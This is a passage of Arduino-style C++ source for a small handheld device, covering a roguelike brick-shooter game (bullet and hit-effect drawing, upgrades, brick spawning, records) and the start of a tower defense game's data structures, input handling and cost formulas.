          int ex = cx + (int)(cosf(rad) * len); int ey = cy + (int)(sinf(rad) * len);
          rogClipLine(cx, cy, ex, ey, TFT_CYAN, CLIP_Y);
          if (age >= 2) { int mx = cx + (int)(cosf(rad) * len * 0.6f); int my = cy + (int)(sinf(rad) * len * 0.6f);
            rogClipPixel(mx + 1, my, TFT_WHITE, CLIP_Y); rogClipPixel(mx - 1, my, TFT_WHITE, CLIP_Y); } } break; }
      case RB_POISON: { for (int a = 0; a < 4; a++) { int px = cx + (a - 2) * 2; int py = cy - age - a;
          int rr = 1 + (a % 2); uint16_t c = (a % 2) ? TFT_GREEN : 0x8010;
          rogClipCircle(px, py, rr, c, CLIP_Y); } break; }
      case RB_HOLY: { rogClipCircle(cx, cy, r, TFT_GOLD, CLIP_Y); rogClipCircle(cx, cy, r + 2, TFT_WHITE, CLIP_Y);
        for (int a = 0; a < 4; a++) { float rad = (a * 90 + 45) * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * (r + 4)); int ey = cy + (int)(sinf(rad) * (r + 4));
          rogClipLine(cx, cy, ex, ey, TFT_GOLD, CLIP_Y); } break; }
      case RB_VOID: { rogClipCircle(cx, cy, r + 3, TFT_MAGENTA, CLIP_Y); rogClipCircle(cx, cy, r + 1, 0x8010, CLIP_Y);
        rogClipFillCircle(cx, cy, r - 1, TFT_BLACK, CLIP_Y); rogClipPixel(cx, cy, TFT_WHITE, CLIP_Y); break; }
      case RB_COSMIC: { rogClipCircle(cx, cy, r + 2, TFT_CYAN, CLIP_Y); rogClipCircle(cx, cy, r, TFT_MAGENTA, CLIP_Y);
        for (int a = 0; a < 8; a++) { float rad = (a * 45 + age * 10) * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * (r + 5)); int ey = cy + (int)(sinf(rad) * (r + 5));
          uint16_t c = (a % 2) ? TFT_YELLOW : TFT_WHITE; rogClipLine(cx, cy, ex, ey, c, CLIP_Y); } break; }
      case RB_THUNDER: { int len = 2 + age * 2;
        for (int a = 0; a < 4; a++) { float rad = (a * 90 + age * 20) * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * len); int ey = cy + (int)(sinf(rad) * len);
          int mx = (cx + ex) / 2 + (a % 2 ? 2 : -2); int my = (cy + ey) / 2 + (a % 2 ? -1 : 1);
          rogClipLine(cx, cy, mx, my, TFT_YELLOW, CLIP_Y); rogClipLine(mx, my, ex, ey, TFT_WHITE, CLIP_Y); }
        if (age < 3) rogClipFillCircle(cx, cy, 2, TFT_WHITE, CLIP_Y); break; }
      case RB_QUANTUM: { rogClipCircle(cx, cy, r + 1, TFT_CYAN, CLIP_Y); rogClipCircle(cx, cy, r + 3, TFT_MAGENTA, CLIP_Y);
        rogClipCircle(cx, cy, r + 5, TFT_CYAN, CLIP_Y); if (age < 3) rogClipFillCircle(cx, cy, 2, TFT_WHITE, CLIP_Y); break; }
      case RB_PLASMA: { if (age < 2) rogClipFillCircle(cx, cy, 4, TFT_WHITE, CLIP_Y);
        else if (age < 4) rogClipFillCircle(cx, cy, 3, TFT_YELLOW, CLIP_Y);
        else if (age < 6) rogClipFillCircle(cx, cy, 2, TFT_ORANGE, CLIP_Y);
        rogClipCircle(cx, cy, r + 2, TFT_RED, CLIP_Y);
        for (int a = 0; a < 8; a++) { float rad = a * 45.0f * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * (r + 4)); int ey = cy + (int)(sinf(rad) * (r + 4));
          rogClipPixel(ex, ey, TFT_YELLOW, CLIP_Y); } break; }
      case RB_SINGULARITY: { rogClipFillCircle(cx, cy, r, TFT_BLACK, CLIP_Y);
        rogClipCircle(cx, cy, r + 2, TFT_MAGENTA, CLIP_Y); rogClipCircle(cx, cy, r + 4, 0x8010, CLIP_Y);
        for (int a = 0; a < 4; a++) { float rad = (a * 90 + age * 30) * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * (r + 3)); int ey = cy + (int)(sinf(rad) * (r + 3));
          rogClipLine(cx, cy, ex, ey, TFT_MAGENTA, CLIP_Y); } break; }
      default: { for (int a = 0; a < 6; a++) { float rad = a * 60.0f * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * (r + 4)); int ey = cy + (int)(sinf(rad) * (r + 4));
          uint16_t c = (a % 2) ? TFT_RED : TFT_GOLD; rogClipLine(cx, cy, ex, ey, c, CLIP_Y);
          rogClipPixel(ex, ey - 1, TFT_YELLOW, CLIP_Y); }
        if (age < 3) rogClipFillCircle(cx, cy, 2, TFT_ORANGE, CLIP_Y); break; }
    }
  }
}
void rogDrawBullet(int x, int y, uint8_t tier) {
  switch (tier) {
    case RB_NORMAL: tft.fillRect(x, y, 2, 4, TFT_YELLOW); break;
    case RB_SPREAD: tft.fillCircle(x, y+1, 2, TFT_ORANGE); tft.drawCircle(x, y+1, 3, TFT_YELLOW); break;
    case RB_LASER: tft.drawFastVLine(x, y-2, 7, TFT_CYAN); tft.drawFastVLine(x-1, y-1, 5, TFT_WHITE); tft.drawFastVLine(x+1, y-1, 5, TFT_WHITE); break;
    case RB_PIERCE: tft.fillTriangle(x, y-4, x-3, y+2, x+3, y+2, TFT_GREEN); tft.drawFastVLine(x, y-3, 5, TFT_WHITE); break;
    case RB_EXPLOSIVE: tft.fillCircle(x, y+1, 3, TFT_RED); tft.drawCircle(x, y+1, 4, TFT_ORANGE); tft.drawPixel(x, y-3, TFT_YELLOW); break;
    case RB_FROST: tft.fillCircle(x, y+1, 2, TFT_WHITE); tft.drawCircle(x, y+1, 3, TFT_CYAN); tft.drawFastHLine(x-3, y+1, 7, TFT_WHITE); tft.drawFastVLine(x, y-2, 7, TFT_WHITE); break;
    case RB_POISON: tft.fillCircle(x, y+1, 3, 0x8010); tft.drawCircle(x, y+1, 3, TFT_MAGENTA); tft.drawPixel(x-1, y, TFT_GREEN); tft.drawPixel(x+1, y+2, TFT_GREEN); break;
    case RB_HOLY: tft.fillCircle(x, y+1, 3, TFT_GOLD); tft.drawCircle(x, y+1, 4, TFT_WHITE); tft.drawCircle(x, y+1, 5, TFT_GOLD); break;
    case RB_VOID: tft.fillCircle(x, y+1, 3, TFT_BLACK); tft.drawCircle(x, y+1, 4, TFT_MAGENTA); tft.drawCircle(x, y+1, 5, 0x8010); tft.drawPixel(x, y+1, TFT_WHITE); break;
    case RB_COSMIC: tft.fillCircle(x, y+1, 4, 0x0010); tft.drawCircle(x, y+1, 5, TFT_CYAN); tft.drawPixel(x, y, TFT_WHITE); tft.drawPixel(x-2, y+2, TFT_YELLOW); tft.drawPixel(x+2, y-1, TFT_MAGENTA); break;
    case RB_THUNDER: tft.drawLine(x, y-3, x+1, y-1, TFT_YELLOW); tft.drawLine(x+1, y-1, x-1, y+1, TFT_YELLOW); tft.drawLine(x-1, y+1, x, y+1, TFT_YELLOW); tft.drawLine(x, y+1, x-1, y+3, TFT_WHITE); tft.drawLine(x, y+1, x+1, y+3, TFT_WHITE); break;
    case RB_QUANTUM: tft.fillCircle(x, y+1, 3, 0x4010); tft.drawCircle(x, y+1, 4, TFT_CYAN); tft.fillCircle(x, y+1, 1, TFT_WHITE); tft.drawPixel(x-4, y, TFT_MAGENTA); tft.drawPixel(x+4, y+2, TFT_MAGENTA); break;
    case RB_PLASMA: tft.fillCircle(x, y+1, 4, TFT_RED); tft.fillCircle(x, y+1, 3, TFT_ORANGE); tft.fillCircle(x, y+1, 2, TFT_YELLOW); tft.drawPixel(x, y+1, TFT_WHITE); break;
    case RB_SINGULARITY: tft.fillCircle(x, y+1, 2, TFT_BLACK); tft.drawCircle(x, y+1, 3, 0x8010); tft.drawCircle(x, y+1, 4, TFT_MAGENTA); tft.drawPixel(x-5, y-2, TFT_MAGENTA); tft.drawPixel(x+5, y+4, TFT_MAGENTA); break;
    default: tft.fillCircle(x, y+1, 3, TFT_RED); tft.fillCircle(x, y+1, 2, TFT_ORANGE); tft.drawCircle(x, y+1, 4, TFT_GOLD); tft.drawPixel(x-1, y+1, TFT_YELLOW); tft.drawPixel(x+1, y+1, TFT_YELLOW); tft.drawPixel(x, y+4, TFT_ORANGE); tft.drawPixel(x-1, y+5, TFT_RED); tft.drawPixel(x+1, y+5, TFT_RED); break;
  }
}
int rogExpNeeded() { double e = 15.0 * pow(1.5, rogLevel - 1); if (e > 100000.0) e = 100000.0; return (int)e; }
void rogClearBrickAt(int idx) {
  if (idx < 0 || idx >= rogBrickCount) return;
  rogBricks[idx].active = false;
  int cx = rogBricks[idx].x + 8, cy = rogBricks[idx].y + 3;
  if (rogBricks[idx].kind == 1) {
    for (int r = 0; r < 6; r++) tft.drawCircle(cx, cy, r, TFT_ORANGE);
    for (int k = 0; k < rogBrickCount; k++) {
      if (!rogBricks[k].active || k == idx) continue;
      if (abs(rogBricks[k].x - rogBricks[idx].x) <= 20 && abs(rogBricks[k].y - rogBricks[idx].y) <= 10) {
        rogBricks[k].hp -= rogDamage * 2;
        if (rogBricks[k].hp <= 0) { rogBricks[k].active = false; rogScore += 5; rogExp += 3; }
      }
    }
  } else if (rogBricks[idx].kind == 2) {
    for (int r = 0; r < 5; r++) tft.drawCircle(cx, cy, r, TFT_CYAN);
    for (int k = 0; k < rogBrickCount; k++) {
      if (!rogBricks[k].active || k == idx) continue;
      if (abs(rogBricks[k].x - rogBricks[idx].x) <= 40 && abs(rogBricks[k].y - rogBricks[idx].y) <= 20) {
        if (rogBricks[k].slowFx < 20) rogBricks[k].slowFx += 5;
      }
    }
  }
}
void rogSpawnRow() {
  int n = 0;
  for (int i = 0; i < rogBrickCount; i++) if (rogBricks[i].active) { if (n != i) rogBricks[n] = rogBricks[i]; n++; }
  rogBrickCount = n;
  bool rowExists = false;
  for (int i = 0; i < rogBrickCount; i++) if (rogBricks[i].active && rogBricks[i].y <= 18) { rowExists = true; break; }
  if (rowExists) return;
  int cellW = 19, startX = 4;
  int elapsedSec = (millis() - rogStartTime) / 1000;
  int hpBase;
  if (elapsedSec < 60) hpBase = 1 + elapsedSec / 30;
  else if (elapsedSec < 120) hpBase = 3 + (elapsedSec - 60) / 20;
  else if (elapsedSec < 240) hpBase = 6 + (elapsedSec - 120) / 15;
  else hpBase = 14 + (elapsedSec - 240) / 12;
  if (hpBase > 99) hpBase = 99;
  for (int i = 0; i < 8; i++) {
    if (rogBrickCount >= 24) break;
    rogBricks[rogBrickCount].x = startX + i * cellW;
    rogBricks[rogBrickCount].y = 14;
    int hp = hpBase + random(-1, 2); if (hp < 1) hp = 1;
    rogBricks[rogBrickCount].hp = hp;
    rogBricks[rogBrickCount].slowFx = 0;
    int rr = random(100);
    uint8_t kind = 0;
    if (rr < 1) kind = 1;
    else if (rr < 2) kind = 2;
    rogBricks[rogBrickCount].kind = kind;
    rogBricks[rogBrickCount].active = true;
    rogBrickCount++;
  }
}
const uint8_t rogDigit3x5[10][5] = {
  {0b111,0b101,0b101,0b101,0b111},{0b010,0b110,0b010,0b010,0b111},{0b111,0b001,0b111,0b100,0b111},
  {0b111,0b001,0b111,0b001,0b111},{0b101,0b101,0b111,0b001,0b001},{0b111,0b100,0b111,0b001,0b111},
  {0b111,0b100,0b111,0b101,0b111},{0b111,0b001,0b010,0b010,0b010},{0b111,0b101,0b111,0b101,0b111},
  {0b111,0b101,0b111,0b001,0b111}
};
void rogDrawNum(int cx, int cy, int value, uint16_t color) {
  char buf[6]; snprintf(buf, sizeof(buf), "%d", value);
  int len = strlen(buf); int totalW = len * 4 - 1; int startX = cx - totalW / 2;
  for (int i = 0; i < len; i++) { int d = buf[i] - '0'; int dx = startX + i * 4;
    for (int r = 0; r < 5; r++) { uint8_t bits = rogDigit3x5[d][r];
      for (int c = 0; c < 3; c++) if (bits & (0b100 >> c)) tft.drawPixel(dx + c, cy + r, color); } }
}
void rogDrawExplodeIcon(int x, int y) {
  tft.drawPixel(x + 8, y + 2, TFT_YELLOW);
  tft.drawPixel(x + 7, y + 1, TFT_RED); tft.drawPixel(x + 9, y + 1, TFT_RED);
  tft.drawPixel(x + 7, y + 3, TFT_RED); tft.drawPixel(x + 9, y + 3, TFT_RED);
  tft.drawPixel(x + 8, y + 4, TFT_YELLOW);
}
void rogDrawSlowIcon(int x, int y) {
  tft.drawFastVLine(x + 8, y, 6, TFT_WHITE);
  tft.drawPixel(x + 6, y + 2, TFT_WHITE); tft.drawPixel(x + 7, y + 1, TFT_WHITE);
  tft.drawPixel(x + 9, y + 1, TFT_WHITE); tft.drawPixel(x + 10, y + 2, TFT_WHITE);
  tft.drawPixel(x + 6, y + 3, TFT_WHITE); tft.drawPixel(x + 7, y + 4, TFT_WHITE);
  tft.drawPixel(x + 9, y + 4, TFT_WHITE); tft.drawPixel(x + 10, y + 3, TFT_WHITE);
}
void rogDraw() {
  tft.fillRect(0, 13, 160, 67, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[40]; snprintf(buf, sizeof(buf), "Lv:%d Exp:%d/%d", rogLevel, rogExp, rogExpNeeded()); tft.drawString(buf, 2, 0);
  snprintf(buf, sizeof(buf), "S:%d", rogScore); tft.drawString(buf, 130, 0);
  for (int i = 0; i < rogBrickCount; i++) {
    if (!rogBricks[i].active) continue;
    int bx = rogBricks[i].x, by = rogBricks[i].y;
    if (rogBricks[i].kind == 1) {
      tft.fillRect(bx, by, 17, 6, 0x8000); tft.drawRect(bx, by, 17, 6, TFT_ORANGE); rogDrawExplodeIcon(bx, by);
    } else if (rogBricks[i].kind == 2) {
      tft.fillRect(bx, by, 17, 6, 0x0210); tft.drawRect(bx, by, 17, 6, TFT_CYAN); rogDrawSlowIcon(bx, by);
    } else {
      int hpv = rogBricks[i].hp; uint16_t c;
      if (hpv >= 15) c = TFT_MAGENTA;
      else if (hpv >= 8) c = TFT_RED;
      else if (hpv >= 4) c = TFT_ORANGE;
      else if (hpv >= 2) c = TFT_YELLOW;
      else c = TFT_GREEN;
      tft.fillRect(bx, by, 17, 6, c);
      tft.drawRect(bx, by, 17, 6, rogBricks[i].slowFx > 0 ? TFT_BLUE : TFT_WHITE);
      if (rogBricks[i].hp > 1) rogDrawNum(bx + 8, by + 1, rogBricks[i].hp, TFT_BLACK);
    }
  }
  tft.drawFastHLine(0, 62, 160, TFT_RED);
  tft.fillRoundRect(rogCannonX, 68, 12, 6, 2, TFT_CYAN);
  tft.fillRect(rogCannonX + 4, 66, 4, 3, TFT_CYAN);
  tft.fillRect(rogCannonX + 1, 74, 3, 2, TFT_DARKGREY);
  tft.fillRect(rogCannonX + 8, 74, 3, 2, TFT_DARKGREY);
}
enum RogUp { RU_FIRE, RU_DMG, RU_BULLET, RU_SPEED, RU_PIERCE, RU_MULTI, RU_CRIT, RU_LIFE };
struct RogUpgradeDef { const char* name; uint8_t type; };
const RogUpgradeDef ROG_UPGRADES[] = {
  {"FireRate -150", RU_FIRE},{"Damage +1", RU_DMG},{"Bullet +1", RU_BULLET},
  {"Next Bullet", RU_SPEED},{"Pierce +1", RU_PIERCE},{"Multi-Shot", RU_MULTI},
  {"Crit +15%", RU_CRIT},{"Life Steal", RU_LIFE}
};
const int ROG_UPGRADE_COUNT = 8;
void rogUpgradeMenu() {
  delay(200);
  bool upHeld = (digitalRead(BTN_UP) == LOW), downHeld = (digitalRead(BTN_DOWN) == LOW), leftHeld = (digitalRead(BTN_LEFT) == LOW);
  bool needDmg = (rogLevel - rogLastDmgLv >= 5);
  bool needFire = (rogLevel - rogLastFireLv >= 3);
  int pool[ROG_UPGRADE_COUNT]; int n = 0;
  if (needDmg) pool[n++] = RU_DMG;
  if (needFire) pool[n++] = RU_FIRE;
  for (int i = 0; i < ROG_UPGRADE_COUNT; i++) {
    if (needDmg && i == RU_DMG) continue;
    if (needFire && i == RU_FIRE) continue;
    pool[n++] = i;
  }
  int startShuffle = 0; if (needDmg) startShuffle++; if (needFire) startShuffle++;
  for (int i = n - 1; i > startShuffle; i--) { int j = startShuffle + random(i - startShuffle + 1); int t = pool[i]; pool[i] = pool[j]; pool[j] = t; }
  int choices[3] = {pool[0], pool[1], pool[2]};
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawCentreString("LEVEL UP!", 80, 16, 1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawCentreString("Choose upgrade", 80, 28, 1);
    for (int i = 0; i < 3; i++) {
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(((i == sel) ? "> " : "  ") + String(ROG_UPGRADES[choices[i]].name), 2, 44 + i * 12);
    }
    bool upNow = (digitalRead(BTN_UP) == LOW), downNow = (digitalRead(BTN_DOWN) == LOW), leftNow = (digitalRead(BTN_LEFT) == LOW);
    if (upNow && !upHeld) sel = (sel + 2) % 3;
    else if (downNow && !downHeld) sel = (sel + 1) % 3;
    else if (leftNow && !leftHeld) {
      int picked = ROG_UPGRADES[choices[sel]].type;
      switch (picked) {
        case RU_FIRE: if (rogFireRate > 150) rogFireRate -= 150; rogLastFireLv = rogLevel; break;
        case RU_DMG: rogDamage++; rogLastDmgLv = rogLevel; break;
        case RU_BULLET: if (rogBulletCount < 5) rogBulletCount++; break;
        case RU_SPEED: if (rogBulletSpeed < ROG_BULLET_SPEED_MAX) { rogBulletSpeed += 2; if (rogBulletSpeed > ROG_BULLET_SPEED_MAX) rogBulletSpeed = ROG_BULLET_SPEED_MAX; } break;
        case RU_PIERCE: rogPierce++; break;
        case RU_MULTI: rogMultiShot++; break;
        case RU_CRIT: rogCrit += 15; if (rogCrit > 100) rogCrit = 100; break;
        case RU_LIFE: rogLifeSteal++; break;
      }
      delay(200); return;
    }
    upHeld = upNow; downHeld = downNow; leftHeld = leftNow;
    delay(30);
  }
}
struct RogBullet { int x, y; uint8_t tier; };
void rogGamePlay() {
  clearAll();
  rogLevel = 1; rogExp = 0; rogScore = 0;
  rogDamage = 1; rogFireRate = 600; rogBulletCount = 1; rogBulletSpeed = 3;
  rogMultiShot = 0; rogCrit = 0; rogLifeSteal = 0;
  rogLastDmgLv = 0; rogLastFireLv = 0;
  rogCannonX = 74; rogBrickCount = 0; rogFxCount = 0;
  rogStartTime = millis();
  rogLastSpawn = millis(); rogLastMove = millis(); rogLastShoot = 0;
  rogMoveInterval = 1000;
  RogBullet bullets[8]; int bCount = 0;
  while (true) {
    char k = getGameKey();
    if (k == 'E') { if (rogScore > rogData.bestScore) rogData.bestScore = rogScore;
      if (rogLevel > rogData.bestLevel) rogData.bestLevel = rogLevel;
      rogSave(); if (rogScore > 0) gameReward(rogScore / 30 + rogLevel); pet2TaskAdd(6, 1);
      rogBrickCount = 0; rogScore = 0; rogFxCount = 0; return; }
    if (digitalRead(BTN_UP) == LOW) rogCannonX -= 4;
    if (digitalRead(BTN_DOWN) == LOW) rogCannonX += 4;
    if (rogCannonX < 0) rogCannonX = 0;
    if (rogCannonX > 148) rogCannonX = 148;
    if (digitalRead(BTN_LEFT) == LOW && millis() - rogLastShoot > (unsigned long)rogFireRate) {
      rogLastShoot = millis();
      uint8_t tier = rogTierFromSpeed(rogBulletSpeed);
      int sx[5]; int sc = 0;
      if (rogBulletCount == 1) sx[sc++] = rogCannonX + 5;
      else if (rogBulletCount == 2) { sx[sc++] = rogCannonX + 2; sx[sc++] = rogCannonX + 8; }
      else { sx[sc++] = rogCannonX + 5; sx[sc++] = rogCannonX + 1; sx[sc++] = rogCannonX + 9; }
      for (int s = 0; s < sc; s++) if (bCount < 8) { bullets[bCount].x = sx[s]; bullets[bCount].y = 66; bullets[bCount].tier = tier; bCount++; }
      for (int m = 0; m < rogMultiShot; m++) if (bCount < 8) { bullets[bCount].x = rogCannonX + 5; bullets[bCount].y = 65 - m; bullets[bCount].tier = tier; bCount++; }
    }
    if (millis() - rogLastSpawn > ROG_SPAWN_MS) { rogLastSpawn = millis(); rogSpawnRow(); }
    // ★ 砖块下落速度：20 级封顶，速度 +1%（整体乘 0.99）
    { int lvl = rogLevel; if (lvl > 20) lvl = 20;
      int elapsedSec = (millis() - rogStartTime) / 1000;
      int timeInterval = (int)(1000.0 * pow(0.996, elapsedSec) * 0.99);
      int levelInterval = (int)((1000 - (lvl - 1) * 35) * 0.99);
      int baseInterval = (timeInterval < levelInterval) ? timeInterval : levelInterval;
      if (baseInterval < 300) baseInterval = 300;
      rogMoveInterval = baseInterval; }
    if (millis() - rogLastMove > (unsigned long)rogMoveInterval) {
      rogLastMove = millis();
      for (int i = 0; i < rogBrickCount; i++) {
        if (!rogBricks[i].active) continue;
        if (rogBricks[i].slowFx > 0) { rogBricks[i].slowFx--; continue; }
        rogBricks[i].y += 1;
      }
    }
    for (int i = 0; i < bCount; i++) {
      bullets[i].y -= rogBulletSpeed;
      if (bullets[i].y < 15) { bullets[i].y = -100; continue; }
      bool hitSomething = false;
      for (int j = 0; j < rogBrickCount && !hitSomething; j++) {
        if (!rogBricks[j].active) continue;
        if (bullets[i].x >= rogBricks[j].x && bullets[i].x <= rogBricks[j].x + 17 &&
            bullets[i].y >= rogBricks[j].y && bullets[i].y <= rogBricks[j].y + 6) {
          int dmg = rogDamage;
          if (rogCrit > 0 && random(100) < rogCrit) dmg *= 2;
          rogBricks[j].hp -= dmg;
          rogAddHitFx(bullets[i].x, bullets[i].y, bullets[i].tier);
          if (rogBricks[j].hp <= 0) {
            rogAddHitFx(rogBricks[j].x + 8, rogBricks[j].y + 3, bullets[i].tier);
            rogClearBrickAt(j);
            rogScore += 10; rogExp += 5;
            if (rogLifeSteal > 0) rogExp += rogLifeSteal;
            while (rogExp >= rogExpNeeded()) { rogExp -= rogExpNeeded(); rogLevel++; pet2AddExp(5); rogUpgradeMenu(); }
          }
          bullets[i].y = -100;
          hitSomething = true;
        }
      }
    }
    int nb = 0;
    for (int i = 0; i < bCount; i++) if (bullets[i].y >= 15) { bullets[nb] = bullets[i]; nb++; }
    bCount = nb;
    for (int i = 0; i < rogBrickCount; i++) {
      if (rogBricks[i].active && rogBricks[i].y + 6 >= 62) {
        if (rogScore > rogData.bestScore) rogData.bestScore = rogScore;
        if (rogLevel > rogData.bestLevel) rogData.bestLevel = rogLevel;
        rogSave(); gameReward(rogScore / 30 + rogLevel); pet2TaskAdd(6, 1); pet2TaskSet(7, rogScore);
        clearAll();
        tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString("Level: " + String(rogLevel), 4, 28);
        tft.drawString("Score: " + String(rogScore), 4, 42);
        while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
        rogBrickCount = 0; rogScore = 0; rogFxCount = 0;
        return;
      }
    }
    rogUpdateFx();
    rogDraw();
    rogDrawFx();
    for (int i = 0; i < bCount; i++) rogDrawBullet(bullets[i].x, bullets[i].y, bullets[i].tier);
    delay(15);
  }
}
void rogShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 24); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(rogData.bestScore), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Level:", 4, 54); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(rogData.bestLevel), 4, 68);
  waitExit();
}
void showRoguelike() {
  deinitWifi(); deinitBLE(); rogLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Roguelike", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2; else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') { if (menuSel == 0) rogGamePlay(); else if (menuSel == 1) rogShowRecords(); rogLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================== Tower Defense ====================
#define TD_PATH_Y 52
#define TD_FLY_Y 30
#define TD_TOWER_ROW1 20
#define TD_MAX_TOWERS 4
#define TD_MAX_ENEMIES 80
#define TD_MAX_BULLETS 64
#define TD_MAX_EXPLOS 12
#define TD_MAX_PARTS 40
enum TdEnemyType { TD_NORMAL=0, TD_FAST, TD_HEAVY, TD_FLY, TD_SWARM, TD_TANK, TD_ELITE, TD_BOSS };
struct TdTower { int cx, cy; uint8_t type; int damage, cooldownMs, range, cooldown; uint8_t pierce; bool explosive; int flashFrames, recoil; float angle; bool active; };
struct TdEnemy { float x; int hp, maxHp; float speed; int reward; int walkFrame, hitFlash; uint8_t type; bool active; };
struct TdBullet { float x, y, vx, vy, prevX, prevY; uint8_t type; int life, pierce; bool explosive; int damage; bool active; };
struct TdExplosion { int x, y, age; bool active; };
struct TdParticle { int x, y, vx, vy, life; uint16_t color; bool active; };
TdTower tdTowers[TD_MAX_TOWERS];
TdEnemy tdEnemies[TD_MAX_ENEMIES];
TdBullet tdBullets[TD_MAX_BULLETS];
TdExplosion tdExplosions[TD_MAX_EXPLOS];
TdParticle tdParticles[TD_MAX_PARTS];
int tdBuildCount[TD_MAX_TOWERS] = {0, 0, 0, 0};
int tdUpgradeCount[TD_MAX_TOWERS][6] = {{0}};
int tdGold = 0, tdHp = 0, tdMaxHp = 10, tdLevel = 1, tdRemaining = 0, tdSpawned = 0, tdSpawnTotal = 0, tdCursor = 0;
unsigned long tdSpawnTimer = 0, tdSpawnInterval = 0, tdGameStart = 0;
TFT_eSprite tdCanvas = TFT_eSprite(&tft);
char tdGetKey() {
  static unsigned long lastRight = 0;
  static bool rHeld = false;
  if (digitalRead(BTN_UP) == LOW) { delay(20); if (digitalRead(BTN_UP) == LOW) { while (digitalRead(BTN_UP) == LOW) delay(5); return 'U'; } }
  if (digitalRead(BTN_DOWN) == LOW) { delay(20); if (digitalRead(BTN_DOWN) == LOW) { while (digitalRead(BTN_DOWN) == LOW) delay(5); return 'D'; } }
  if (digitalRead(BTN_LEFT) == LOW) { delay(20); if (digitalRead(BTN_LEFT) == LOW) { while (digitalRead(BTN_LEFT) == LOW) delay(5); return 'L'; } }
  bool rNow = (digitalRead(BTN_RIGHT) == LOW);
  if (rNow && !rHeld) {
    delay(20);
    if (digitalRead(BTN_RIGHT) == LOW) {
      rHeld = true;
      while (digitalRead(BTN_RIGHT) == LOW) delay(5);
      rHeld = false;
      unsigned long now = millis();
      if (lastRight > 0 && (now - lastRight) < 400) { lastRight = 0; return 'E'; }
      lastRight = now;
      return 'R';
    }
  } else if (!rNow && rHeld) rHeld = false;
  return 0;
}
char tdMenuKey() {
  if (digitalRead(BTN_UP) == LOW) { delay(20); if (digitalRead(BTN_UP) == LOW) { while (digitalRead(BTN_UP) == LOW) delay(5); return 'U'; } }
  if (digitalRead(BTN_DOWN) == LOW) { delay(20); if (digitalRead(BTN_DOWN) == LOW) { while (digitalRead(BTN_DOWN) == LOW) delay(5); return 'D'; } }
  if (digitalRead(BTN_LEFT) == LOW) { delay(20); if (digitalRead(BTN_LEFT) == LOW) { while (digitalRead(BTN_LEFT) == LOW) delay(5); return 'L'; } }
  if (digitalRead(BTN_RIGHT) == LOW) { delay(20); if (digitalRead(BTN_RIGHT) == LOW) { while (digitalRead(BTN_RIGHT) == LOW) delay(5); return 'R'; } }
  return 0;
}
int tdTowerBaseCost(uint8_t type) { int base; switch (type) { case 0: base = 12; break; case 1: base = 60; break; case 2: base = 40; break; case 3: base = 30; break; default: return 9999; } return (int)(base * 0.9); }
int tdUpgradeBaseCost(int idx) { int base; switch (idx) { case 0: base = 40; break; case 1: base = 50; break; case 2: base = 20; break; case 3: base = 45; break; case 4: base = 70; break; case 5: base = 0; break; default: return 9999; } return (int)(base * 0.9); }
int tdTowerCost(int pos, uint8_t type) { int base = tdTowerBaseCost(type); return (int)(base * pow(1.15, tdBuildCount[pos])); }
int tdUpgradeCost(int pos, int idx) { if (idx == 5) return tdTowerBaseCost(tdTowers[pos].type) / 2; int base = tdUpgradeBaseCost(idx); return (int)(base * pow(1.20, tdUpgradeCount[pos][idx])); }
const char* tdTowerName(uint8_t type) { switch (type) { case 0: return "MGun"; case 1: return "Cannon"; case 2: return "Laser"; case 3: return "Ice"; } return "?"; }
uint16_t tdTowerColorOf(uint8_t type) { switch (type) { case 0: return 0x07FF; case 1: return 0xFC00; case 2: return 0xF81F; case 3: return 0x07FF; } return 0x07FF; }
void tdApplyTowerDefaults(int idx, uint8_t type) { TdTower* t = &tdTowers[idx]; t->type = type; t->cooldown = 0; t->flashFrames = 10; t->recoil = 0; t->angle = 0; t->pierce = 0; t->explosive = false;
  switch (type) { case 0: t->damage = 4; t->cooldownMs = 250; t->range = 65; break; case 1: t->damage = 80; t->cooldownMs = 1200; t->range = 80; break; case 2: t->damage = 15; t->cooldownMs = 400; t->range = 200; break; case 3: t->damage = 2; t->cooldownMs = 60; t->range = 50; break; } }
int tdEnemyHpForLevel(int lv) { if (lv <= 1) return 40; struct { int lvl; int hp; } pts[] = {{1,40},{5,72},{10,116},{15,187},{20,300},{30,778},{50,5235}};
  if (lv >= 50) { double hp = 5235.0 * pow(1.10, lv - 50); if (hp > 50000000.0) hp = 50000000.0; return (int)hp; }
